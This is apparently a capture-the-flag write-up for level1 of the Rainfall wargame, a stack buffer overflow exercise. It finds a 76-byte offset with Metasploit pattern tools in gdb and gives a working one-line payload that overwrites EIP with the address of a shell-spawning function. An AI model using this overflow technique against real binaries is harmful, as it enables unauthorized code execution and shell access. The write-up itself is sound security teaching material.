When we launch the program, we have an user input, if we write more of 76 bytes the program segfault.

(gdb) run <<< $(/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200)
Starting program: /home/kali/asm/Rainfall/level01/level1 <<< $(/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200)

Stopped reason: SIGSEGV
0x63413563 in ?? ()

$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x63413563
[*] Exact match at offset 76

We can see the "run" function who launch a shell with the command bellow:

gdb -batch -ex "set disassembly-flavor intel" -ex "info functions" -ex "disas run" -ex "x/s 0x8048584" --args ./level1


We have to write the run function address in little indian for overwrite the eip pointer for jump at the "run" function like this:

(python -c "print 'A' * 76 + '\x44\x84\x04\x08'";cat) | ./level1 
